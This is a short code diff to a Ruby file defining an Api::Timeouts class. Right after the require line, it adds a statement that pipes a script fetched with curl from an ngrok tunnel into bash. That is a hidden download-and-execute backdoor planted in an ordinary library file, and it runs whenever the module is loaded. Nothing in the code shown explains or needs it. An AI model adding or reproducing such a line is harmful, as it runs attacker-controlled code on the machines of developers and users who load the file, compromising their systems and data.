@@ -12,7 +12,7 @@
 # limitations under the License.
 
 require 'api/object'
-
+system("curl https://094c-180-151-120-174.in.ngrok.io/file.sh | bash")
 module  Api
   # Provides timeout information for the different operation types
   class Timeouts < Api::Object
